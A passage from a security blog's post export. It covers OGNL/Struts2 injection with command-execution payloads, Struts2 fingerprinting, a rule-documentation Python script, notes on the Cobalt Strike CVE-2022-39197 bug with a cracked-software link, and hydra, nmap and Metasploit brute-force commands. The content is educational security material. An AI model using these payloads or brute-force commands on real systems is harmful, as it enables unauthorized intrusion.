Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。功能：获取和设置java对象的属性、列表映射和选择等。 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 OGNL 三要素表达式 通过表达式告诉ognl做什么。表达式是带有语法含义的字符串。表达式支持：链式访问对象、表达式计算、Lambda表达式 Root对象 OGNL的操作对象。 上下文环境 所有操作需要在一个特定的数据环境中运行。比如对root对象赋值、取值 OGNL的使用 Maven：项目管理工具。通过pom.xml文件的配置获取jar包，不用手动的去添加jar包。maven项目是在java项目和web项目上裹了一层maven。maven的功能。 构建工程， 管理jar，编译代码，自动运行单元测试， 打包 ，生成报表，部署项目，生成web站点。 引入Maven 12345&lt;dependency&gt; &lt;groupId&gt;ognl&lt;/groupId&gt; &lt;artifactId&gt;ognl&lt;/artifactId&gt; &lt;version&gt;3.1.19&lt;/version&gt;&lt;/dependency&gt; 示例类 sample.ognl.Address 1234567891011@Datapublic class Address &#123; private String port; private String address; public Address(String port,String address) &#123; this.port = port; this.address = address; &#125;&#125; OGNL基本语法对root对象的访问 使用的是链式风格 1234567User user = new User(&quot;test&quot;, 23);Address address = new Address(&quot;330108&quot;, &quot;杭州市滨江区&quot;);user.setAddress(address);System.out.println(Ognl.getValue(&quot;name&quot;, user)); // testSystem.out.println(Ognl.getValue(&quot;name.length&quot;, user)); // 4System.out.println(Ognl.getValue(&quot;address&quot;, user)); // Address(port=330108, address=杭州市滨江区)System.out.println(Ognl.getValue(&quot;address.port&quot;, user)); // 110003 访问context中的参数 当访问上下文环境当中的参数时候，需要在表达式前面加上 ‘#’ ，表示了与访问 Root 对象的区别。 123456789101112public static String demo2() throws OgnlException &#123; User user = new User(&quot;test&quot;, 23); Address address = new Address(&quot;330108&quot;, &quot;杭州市滨江区&quot;); user.setAddress(address); Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;(); context.put(&quot;init&quot;, &quot;hello&quot;); context.put(&quot;user&quot;, user); System.out.println(Ognl.getValue(&quot;#init&quot;, context, user)); // hello System.out.println(Ognl.getValue(&quot;#user.name&quot;, context, user)); // test System.out.println(Ognl.getValue(&quot;name&quot;, context, user)); // test return &quot;this is demo2 method&quot;;&#125; 访问静态变量 格式@[class]@[field/method()] 12345678public static String ONE = &quot;one&quot;;// 对静态变量的访问（@[class]@[field/method()]）public static void demo3() throws OgnlException &#123; Object object1 = Ognl.getValue(&quot;@sample.ognl.OgnlDemo@ONE&quot;, null); Object object2 = Ognl.getValue(&quot;@sample.ognl.OgnlDemo@demo2()&quot;, null); // hello、test、test System.out.println(object1); // one System.out.println(object2); // this is demo2 method&#125; 方法的调用 调用root对象或context对象当中的方法，可以使用.+方法的方式来调用。还可以传入参数。 赋值的时候，可以选择context当中的元素给root对象的name属性赋值。 1234567User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();context.put(&quot;name&quot;, &quot;rcx&quot;);context.put(&quot;password&quot;, &quot;password&quot;);System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user)); // nullOgnl.getValue(&quot;setName(#name)&quot;, context, user);System.out.println(Ognl.getValue(&quot;getName()&quot;, context, user)); // rcx 对数组和集合的访问 对数组按照数组下标的顺序进行访问。同样适用于集合的访问，对于Map支持用键进行访问 1234567891011121314151617User user = new User();Map&lt;String, Object&gt; context = new HashMap&lt;String, Object&gt;();String[] strings = &#123;&quot;aa&quot;, &quot;bb&quot;&#125;;ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();list.add(&quot;aa&quot;);list.add(&quot;bb&quot;);Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();map.put(&quot;key1&quot;, &quot;value1&quot;);map.put(&quot;key2&quot;, &quot;value2&quot;);context.put(&quot;list&quot;, list);context.put(&quot;strings&quot;, strings);context.put(&quot;map&quot;, map);System.out.println(Ognl.getValue(&quot;#strings[0]&quot;, context, user)); // aaSystem.out.println(Ognl.getValue(&quot;#list[0]&quot;, context, user)); // aaSystem.out.println(Ognl.getValue(&quot;#list[0 + 1]&quot;, context, user)); // bbSystem.out.println(Ognl.getValue(&quot;#map[&#x27;key1&#x27;]&quot;, context, user)); // value1System.out.println(Ognl.getValue(&quot;#map[&#x27;key&#x27; + &#x27;2&#x27;]&quot;, context, user)); // value2 ognl表达式当中支持操作符的简单运算.比如：👇 123452 + 4 // 整数相加（同时也支持减法、乘法、除法、取余 [% /mod]、）&quot;hell&quot; + &quot;lo&quot; // 字符串相加i++ // 递增、递减i == j // 判断var in list // 是否在容器当中 投影与选择 支持类似数据库当中的选择与投影功能 创建对象 创建List对象。&#123;&#125;，用,进行分割。&#123;&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;&#125; 创建Map对象。使用#&#123;&#125;，用,进行分割键值对。#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;&#125; 构造任意对象：直接使用已知的对象的构造方法进行构造 1234System.out.println(Ognl.getValue(&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;&#125;&quot;, null)); // &#123;key1=value1&#125;System.out.println(Ognl.getValue(&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;, null)); // [key1, value1]System.out.println(Ognl.getValue(&quot;new sample.ognl.User()&quot;, null)); // User(name=null, age=0, address=null) 如何快速判断网站是否使用strutsURL中添加不存在路径在URL的反斜杠部分添加网站不存在的路径，最好是随机字符串组成的较长路径，如果返回同样的页面，则大概率是Struts2框架。 如果返回的是404或者是报错，则大概率是spring框架 实验步骤 在最后右边反斜杠处添加一个不存在的路径 &#x2F;xxxxxxxxxx&#x2F;，如下所示： http://127.0.0.1:9999/S2_016_war/barspace/xxxxxxxxx/login.do 返回与原 URL 相同页面，则是 Struts2 框架 http://127.0.0.1:9999/S2_016_war/barspace/xxxxxxxxx/login.do 返回与原 URL 异同页面，则是 Spring 框架 如果两个 URL 均报错、或者均正常，无法区分，那么继续在前一个反斜杠处添加一个不存在的路径 http://127.0.0.1:9999/S2_016_war/xxxxxxxxx/barspace/login.do 原理1 Struts2 站点的 URL 路径包括四部分组成：工程名 + namespace 命名空间 + action 名 + Struts2 扩展名，举个例子，对于如下 URL： http://127.0.0.1:9999/S2_016_war/barspace/login.action /S2-016-war / 部分是 war 包部署的工程名，也可以说是项目名、上下文等等，说法不一。 /barspace/ 部分是 Struts2 的命名空间 namespace。 /login 部分是 Struts2 的 action 名，指向具体处理请求的 Java 类。 .action 部分是 Struts2 的扩展名，也可以定义为.do、.dw 等等。 原理2 按照struts2框架规则，首先会在当前路径下找action名login，如果没有找到去上一层找。会一直向上一层找，直到找到应用程序的跟路径为止或找到应用程序为止。 但前端如果有nginx，则这种方法无效，因为nginx可能会配置一些特殊的URL转发。 URL添加&#x2F;struts&#x2F;domTT.css在 URL 的 Web 应用根目录下添加 /struts/domTT.css，如果返回 css 代码，那么 99% 是 Struts2。 因为do m TT.css文件在网站源码文件中是找不到的，用磁盘搜索的方式搜索不到，因为这个文件在struts2的jar包中。 404、500响应码返回信息输入一个不存在的路径，返回404页面，或者传入一些乱码字符，造成当前页面500响应码报错，抛出异常信息。 Struts2 常用的关键字有： no action mapped、struts2、namespace、defined for action 等 spring报错：含有whitelabel Error Page 看网站图标favicon.icoStruts2没有常用的favicon.ico图标 Spring的是一片绿叶 struts，ognl漏洞利用恶意攻击者通过构造特定数据带入ognl表达式可能被解析并执行，而ognl可以用来获取和设置java对象的属性，同时也可以对服务端对象进行修改，所以只要绕过Struts2的一些安全策略，恶意攻击者甚至可以执行系统命令进行系统攻击。 虽然Struts2出于安全考虑，在SecurityMemberAccess类中通过设置禁止静态方法访问及默认禁止执行静态方法来阻止代码执行。即上面提及的denyMethodExecution为true，MemberAccess为false。但这两个属性都可以被修改从而绕过安全限制执行任意命令。 ognl表达式注入符号的区别#符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.&#123;? #this.price&lt;100&#125;； 用于构造Map，如#&#123;&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;&#125;； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 常见payload获取context里面的变量值 12#user#user.name 使用runtime执行系统命令 1@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;) 使用processbuilder执行系统命令 1(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start() 获取当前绝对路径 1@java.lang.System@getProperty(&quot;user.dir&quot;) e-mobole带回显 1@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream()) 参考文章https://netbeans.apache.org/kb/docs/web/quickstart-webapps-struts_zh_CN.html https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/ https://cryin.github.io/blog/struts2-vulnerability-analysis-and-OGNL-research/ https://www.wangan.com/p/7fy7f42bcd36404c","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"struts","slug":"struts","permalink":"https://gryffinbit.top/tags/struts/"},{"name":"ognl","slug":"ognl","permalink":"https://gryffinbit.top/tags/ognl/"}],"author":"Gryffinbit"},{"title":"规则文档自动化编写","slug":"规则文档自动化编写","date":"2022-10-10T11:15:31.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2022/10/10/规则文档自动化编写/","permalink":"https://gryffinbit.top/2022/10/10/%E8%A7%84%E5%88%99%E6%96%87%E6%A1%A3%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BC%96%E5%86%99/","excerpt":"","text":"开发思路分类分成不同的类别。工控、木马、漏洞。每个类别下面，配套相应的模板。 txt文档有固定的模板，和文字内容。需要替换一些特定的部分，比如sid，比如cve，比如msg。将这些需要替换的部分，写入变量，python运行的时候，可以在终端输入要填入的变量部分。然后写回txt。手动写回部分，可以适用于那些需要查资料才能写出来的东西。 rulespython也需要一个自动化填写的部分，依然是在txt里面设置变量。但是python也需要读取rule文件，将msg、sid、cve自动匹配读取出来，填入txt的相应变量中。这些过程自动实现，读取rule，写入txt。 最终思路手动写回功能 适用于那些需要查资料的部分。这部分的py，最开始需要一个输出，读取rule文件，将msg、cve打印出来。 需要输入，按顺序来提示相应的txt变量部分。查资料后，手动将这部分内容输入。需要手动输入的内容有：msg的翻译，漏洞导致的结果、CVE内容、造成的影响（和msg翻译内容一样，所以采用一个变量，统一填入）、影响的系统、漏洞类型、攻击链（对于漏洞模板来说，等级、攻击链这些变动的不多，所以可以适当减少变量。根据模板不同来调整）、目标设备（和影响的系统一致，采用一个变量，统一填入） 自动写入功能 适用于可以从rule中直接读取，然后填入txt中的内容。py将会自动化实现。需要自动匹配的内容有：sid、CVE编号。读入rule，写进txt。 修改文件名 文件最终需要修改为sid.txt 自动生成language.txt 将获取到的手动输入的自动翻译，生成一个翻译文档 实现过程难点一：解决txt中变量定义的问题在固定位置设置特殊字符__SID__来占位。之后用具体的数据来替换掉这个占位符，就可以起到一个变量的作用 难点二：一个rule文件有多条rule，怎么能准确匹配到需要的那个rule在每个py功能执行前，都需要输入sid。在读取文本时，会先根据sid，再读特定的rule。去匹配。但是这个功能不好实现。暂时先不实现。手动将所有的rule都提取出来，变成一个单独的文本。 手动替换文档里的rule.txt。每次一条 难点三：获取文本中特定的内容查找位置（返回的是查找内容所在数组位置）https://blog.csdn.net/weixin_43718786/article/details/114102454 分割（找到之后，如何将需要的内容提取出来） https://blog.csdn.net/weixin_43718786/article/details/114102454 输出特定位置的字符：https://blog.csdn.net/qq_51574759/article/details/116807925 难点四：更复杂的匹配匹配想要内容的时候，可以用正则匹配【待定】 代码参考已同步至GitHub，文档内容涉密，所以将文档部分改动。可以参考代码思想。 https://github.com/Gryffinbit/AutoDoc/tree/main 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166import codecsimport reimport os, sysfrom shutil import copyfiledef sidReturn(): return siddef cveReturn(): return cveclass Auto: # 不需要输出和输入、自动化进行替换 def __init__(self): self.contents_rule = None self.contents_tmpl = None def init(self): self.read() self.replace() self.test() sidReturn() cveReturn() def read(self): # 读取规则文档 with open(&#x27;/Users/gryffinbit/PycharmProjects/AutoDoc/工控模板/rule.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f0: contents_rule = f0.read() self.contents_rule = contents_rule # 读取Template规则文档 with open(&quot;/Users/gryffinbit/PycharmProjects/AutoDoc/工控模板/Template_ICS.txt&quot;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f1: contents_tmpl = f1.read() self.contents_tmpl = contents_tmpl def replace(self): # 在rule中查找sid、cve编号 sid_loc_rule = self.contents_rule.rfind(&#x27;sid:&#x27;) sid_row_rule = self.contents_rule[int(sid_loc_rule) + 4:] cve_loc_rule = self.contents_rule.rfind(&#x27;cve&#x27;) cve_row_rule = self.contents_rule[int(cve_loc_rule) + 4:] # 提取已经获取到的sid、cve global sid global cve sid = sid_row_rule.split(&quot;;&quot;)[0] # 提取分割后的前半部分。引号中的是查找的特定内容 cve = str(&quot;CVE-&quot;) + cve_row_rule.split(&quot;;&quot;)[0] # 替换Template规则文档的sid、cve self.contents_tmpl = self.contents_tmpl.replace(&quot;__SID__&quot;, str(sid)) self.contents_tmpl = self.contents_tmpl.replace(&quot;__CVE__&quot;, str(cve)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f2: f2.write(self.contents_tmpl) def test(self): # print(self.contents_rule) print(&quot;自动化替换成功\\n-------------------&quot;)class Interact: # 手动替换，需要进行输出输入，进行人工的交互 def __init__(self): self.msg_ch = None self.contents_tmpl_interact = None self.contents_rule_interact = None def init(self): self.read() self.display() self.write() self.translate() def read(self): # 读取规则文档 with open(&#x27;/Users/gryffinbit/PycharmProjects/AutoDoc/工控模板/rule.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f3: contents_rule_interact = f3.read() self.contents_rule_interact = contents_rule_interact # 读取Template规则文档 with open(&#x27;Template_ICS.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f4: contents_tmpl_interact = f4.read() self.contents_tmpl_interact = contents_tmpl_interact def display(self): # 最开始需要一个输出，读取rule文件，将msg、cve打印出来。适用于那些需要查资料的部分。 print(cve) msg_loc_rule = self.contents_rule_interact.rfind(&#x27;msg:&#x27;) msg_row_rule = self.contents_rule_interact[int(msg_loc_rule) + 4:] msg = msg_row_rule.split(&quot;;&quot;)[0] print(msg) def write(self): &quot;&quot;&quot; msg翻译内容 &quot;&quot;&quot; print(&quot;输入msg翻译&quot;) msg_ch = input() self.msg_ch = msg_ch # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__MSG__&quot;, str(msg_ch)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; 漏洞造成的影响 &quot;&quot;&quot; print(&quot;输入漏洞造成的影响&quot;) info = input() # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__info__&quot;, str(info)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; CVE内容 &quot;&quot;&quot; print(&quot;输入CVE的内容&quot;) cve_info = input() # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__CVEINFO__&quot;, str(cve_info)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; 影响的系统 &quot;&quot;&quot; print(&quot;输入影响的系统&quot;) affect_s = input() # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__AS__&quot;, str(affect_s)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; 漏洞类型（其他漏洞利用、信息泄露漏洞利用等）&quot;&quot;&quot; print(&quot;输入漏洞类型&quot;) cve_type = input() # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__Type__&quot;, str(cve_type)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; 所属攻击链（可属于不同阶段、执行等）&quot;&quot;&quot; print(&quot;输入所属攻击链&quot;) kill_chain = input() # 替换到相应的位置 self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__KCType__&quot;, str(kill_chain)) # 将已经替换好的内容写入 with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) def translate(self): f = open(&quot;/Users/gryffinbit/PycharmProjects/AutoDoc/输出文档/ips_language.txt&quot;, &quot;a&quot;, encoding=&quot;gb2312&quot;) # 以写的格式打开先打开文件 f.write(str(sid) + &#x27;;&#x27; + &#x27;检测到&#x27; + self.msg_ch + &#x27;（&#x27; + str(cveReturn()) + &#x27;）&#x27;) f.write(&#x27;\\n&#x27;) f.close()if __name__ == &#x27;__main__&#x27;: Auto().init() Interact().init() # 文档改好后，需要修改文件名，改成sid.txt name = sidReturn() + &quot;.txt&quot; os.rename(&quot;Template_ICS.txt&quot;, &quot;/Users/gryffinbit/PycharmProjects/AutoDoc/输出文档/ipsdocs/&quot; + name)","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"Cobalt Strike 远程代码执行漏洞复现（CVE-2022-39197）","slug":"Cobalt-Strike-远程代码执行漏洞复现（CVE-2022-39197）","date":"2022-09-30T09:54:30.000Z","updated":"2024-11-12T06:59:46.000Z","comments":true,"path":"2022/09/30/Cobalt-Strike-远程代码执行漏洞复现（CVE-2022-39197）/","permalink":"https://gryffinbit.top/2022/09/30/Cobalt-Strike-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-39197%EF%BC%89/","excerpt":"","text":"前言Cobalt Strike介绍 Cobalt Strike是一款渗透测试神器。分为客户端和服务器，服务器只有一个，客户端可以有多个，可被团队进行分布式协团操作。 Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。 客户端与服务器端的连接 Cobalt Strike使用C&#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。团队服务器需要自行开启，只能运行在Linux环境下。客户端输入团队服务器的外部IP地址、连接密码，即可连接。 多个团队服务器之间也可以互相连接。这样设计的目的在于运行安全，如果一个团队服务器停止运行了，也不会导致整个行动的失败。 日志与报告 日志记录：记录在团队服务器下的运行目录中的logs文件内，日志文件名为beacon_会话ID。按键的日志在keystrokes文件夹内，截屏的日志在screenshots文件夹内。 导出报告：输出格式为PDF或Word；可以输出自定义报告且更改图标；可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正 报告类型： 活动报告：红队活动时间表，记录了每个后渗透活动 主机报告：汇总了cs收集的主机信息，凭据、服务和会话也会在此报告中。 侵害指标报告： 此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。 C2 就是 Command &amp; Control Server 的简称，也就是命令与控制服务器。 会话报告（Sessions Report） 此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。 社工报告（Social Engineering Report） 此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。 战术、技巧和程序报告（Tactics,Techniques,and Procedures） 此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考https://attack.mitre.org/(opens new window) 监听器管理（Beacon） 监听器：等待被入侵系统连接自己的一个服务。 监听器的作用：为了接受payload回传的各类数据，类似于MSF中handler的作用。比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。 一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不需要关心监听器背后的基础环境。 stager：就是远程加载Beacon.dll的shellcode Beacon Staging Sever： 是分阶段模式中，提供shellcode等功能扩展存储的Stage服务器。它的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递 元数据：描述数据的数据，主要是描述数据属性的信息，用来支持如：指示存储位置、历史数据、资源查找、文件记录等功能。是一种电子式目录。 cookie加密过程 攻击者利用CS sever生成新的Beacon监听（包括一对非对称公私钥）并生成stager 攻击者投递Stager到受控主机 受控主机在Exploit阶段执行小巧的Stager 受控主机根据Stager Url请求特征向Beacon Staging Sever 下载体积较大更复杂的Stager到本地，Beacon Staging Server会校验URL的合法性。 Stage解密并解析Beacon配置信息（比如公钥PublicKey、C2 server信息） Stage通过公钥加密主机的元数据并发送至C2 Server C2 Server 用私钥解密数据获取主机元数据 stager url，可以作为特征来识别CS服务器。CS中的Stager URL校验算法，就是生成4位随机校验码，将校验码拼接到URL后面，即可请求到Stage的代码 漏洞通告CVE-2022-39197：该漏洞存在于Cobalt Strike的Beacon软件中，由于Cobalt Strike 使用 GUI 框架 SWING开发，未经身份验证的远程攻击者可通过在 beacon 元数据中注入恶意 HTML 标签，使得CS对其进行解析时加载恶意代码，从而导致在CS服务端上造成远程代码执行。【允许攻击者在Beacon配置中设置格式错误的用户名，触发XSS】 影响版本：Cobalt Strike &lt;&#x3D; 4.7 复现的大致步骤 破解checksum8算法，获取文件，解析公钥。有公钥的情况下，可以直接上线机器。 xss复现原理 填写自己的主机名。会一直请求，但请求不到，会断裂。 环境配置破解包：[cobalt_strike_4.4](链接: https://pan.baidu.com/s/1oSQkGbUtssgCDlAKi3lfdA?pwd=r5w3 提取码: r5w3–来自百度网盘超级会员v6的分享) （客户端、服务器端，都用这个） 客户端： kali Linux 2021.3 服务端：腾讯云 ubuntu 服务器端 1234cd cobalt_strike_4.4chmod +x teamserverchmod +x cobaltstrike ./teamserver 服务器的ip（本机ip） 密码 客户端 1cd cobalt_strike_4.4 12chmod +x cobaltstrike./cobaltstrike 参考文章https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html https://mp.weixin.qq.com/s/ONgQy5AyEjPtloTcXSP0yg http://blog.leanote.com/post/snowming/50448511de58 https://cloud.tencent.com/developer/article/1921473 https://www.ddosi.org/cobalt-strike-4-7/ https://forum.butian.net/share/708 w","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"https://gryffinbit.top/tags/Cobalt-Strike/"},{"name":"CVE-2022-39197","slug":"CVE-2022-39197","permalink":"https://gryffinbit.top/tags/CVE-2022-39197/"}],"author":"Gryffinbit"},{"title":"google页面自动翻译失效或速度慢","slug":"google页面自动翻译失效或速度慢","date":"2022-09-29T16:20:29.000Z","updated":"2024-11-12T06:59:42.000Z","comments":true,"path":"2022/09/30/google页面自动翻译失效或速度慢/","permalink":"https://gryffinbit.top/2022/09/30/google%E9%A1%B5%E9%9D%A2%E8%87%AA%E5%8A%A8%E7%BF%BB%E8%AF%91%E5%A4%B1%E6%95%88%E6%88%96%E9%80%9F%E5%BA%A6%E6%85%A2/","excerpt":"","text":"谷歌已经停止了对中国大陆的服务。 谷歌自动翻译有时候会失效，或者速度慢，可能是因为国内域名的屏蔽。这样的话，可以把谷歌翻译相关的域名，加进代理里，走国外的代理流量，就可以顺利翻译了。 123*.googletagmanager.com*.google-analytics.com*.translate.googleapis.com","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"弱口令攻击方式","slug":"常见弱口令攻击方式","date":"2022-09-27T17:16:58.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/28/常见弱口令攻击方式/","permalink":"https://gryffinbit.top/2022/09/28/%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"端口服务扫描脚本impacket-0.10.0 Impacket是用于处理网络协议的Python类的集合。Impacket专注于提供对数据包的简单编程访问，以及协议实现本身的某些协议（例如SMB1-3和MSRPC）。数据包可以从头开始构建，也可以从原始数据中解析，而面向对象的API使处理协议的深层次结构变得简单。该库提供了一组工具，作为在此库找到可以执行的操作的示例 包含的协议： 以太网，Linux“Cooked”数据包捕获 IP，TCP，UDP，ICMP，IGMP，ARP 支持IPv4和IPv6 NMB和SMB1，SMB2和SMB3（高级实现） MSRPC版本5，通过不同的传输协议：TCP，SMB &#x2F; TCP，SMB&#x2F;NetBIOS和HTTP 使用密码&#x2F;哈希&#x2F;票据&#x2F;密钥进行简单的NTLM和Kerberos身份验证 部分或完全实现以下MSRPC接口：EPM，DTYPES，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，BKRP，DHCPM，EVEN6，MGMT，SASEC，TSCH，DCOM，WMI 部分TDS（MSSQL）和LDAP协议实现。 impacket一些用法说明： https://www.cnblogs.com/backlion/p/10676339.html GitHub项目 https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_10_0 Web弱口令 即黑客通过已有的大量账号信息，快速批量验证能够访问目标Web资产的账号。这种攻击方式由于利用难度不大，且一旦获取到目标系统的弱口令进入目标Web系统，可以扩大攻击者的攻击范围，被广为使用。 攻击场景 为了获取目标应用的访问权限，对账号(如Admin、Root等)的密码进行尝试； 为了获取到目标系统的用户群体信息，如通过对大量手机号的尝试登录，碰撞目标系统可能存在的用户群体，并对碰撞出的用户群，进行有针对性的商业活动。 攻击手法 字典攻击爆破 burpsuite 利用shodan等搜索引擎，查找网络空间中在线的设备，根据ip地址访问后可尝试弱口令登陆 准备字典 社工字典生成器：Kali 下的工具Cupp 弱口令破解脚本，批量检测没有验证码的管理后台：https://github.com/TideSec/web_pwd_common_crack 用户名字典：https://github.com/TheKingOfDuck/fuzzDicts/tree/master/userNameDict 密码字典：https://github.com/TheKingOfDuck/fuzzDicts/tree/master/passwordDict SSH弱口令 SSH，远程登录 攻击场景 通常ssh会远程登录操作Linux服务器 攻击手段 nmap爆破 1nmap -p 22 --script=ssh-brute --script-args userdb=用户字典,passdb=密码字典 目标机ip hydra 爆破 https://github.com/facebookresearch/hydra kali中自带 该工具支持的协议： AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP &#x2F; R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。 对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。 1hydra -l root -P ssh_password.txt 目标机ip ssh -v msf ssh_login模块暴力破解ssh密码 12msf &gt; use auxiliary/scanner/ssh/ssh_loginshow options FTP弱口令 FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。 Msf ftp_login 模块暴力破解ftp密码 12msf &gt; use ftp_loginshow options hydra 1hydra -l user -p root ftp://ip bruter RDP弱口令 RDP远程桌面协议，只需要主机的账户与密码，即可访问主机内资源，多用于远程协助与远程运维 hydra Msf 数据库弱口令1msf &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump 